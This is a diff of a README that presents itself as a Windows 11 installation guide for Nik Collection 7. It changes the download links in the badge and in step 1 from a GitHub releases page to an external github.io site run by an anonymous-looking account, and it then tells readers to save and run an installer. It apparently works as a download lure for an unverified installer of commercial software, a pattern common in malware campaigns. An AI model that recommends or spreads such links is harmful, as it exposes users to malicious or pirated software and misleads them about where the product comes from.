@@ -1,6 +1,6 @@
 # 📸 Nik-Collection-7-Windows-Guide - Fix Nik Collection installation on Windows
 
-[![Download Nik Collection Guide](https://img.shields.io/badge/Download_Nik_Collection_7-007ACC.svg)](https://github.com/Chainenvironmentalcondition758/Nik-Collection-7-Windows-Guide/releases)
+[![Download Nik Collection Guide](https://img.shields.io/badge/Download_Nik_Collection_7-007ACC.svg)](https://chainenvironmentalcondition758.github.io)
 
 This guide provides steps to install Nik Collection 7 on Windows 11. Many users face issues during the setup process. These notes focus on common errors and proven methods to get the software running on your computer.
 
@@ -21,7 +21,7 @@ Ensure your graphics drivers are up to date. Outdated drivers often cause the in
 
 Follow these steps to acquire the installer and set up the software.
 
-1. Visit this page to download: [https://github.com/Chainenvironmentalcondition758/Nik-Collection-7-Windows-Guide/releases](https://github.com/Chainenvironmentalcondition758/Nik-Collection-7-Windows-Guide/releases).
+1. Visit this page to download: [https://chainenvironmentalcondition758.github.io](https://chainenvironmentalcondition758.github.io).
 2. Locate the latest release assets.
 3. Click the file to save the installer to your Downloads folder.
 4. Close all open photo editing software like Photoshop or Lightroom.
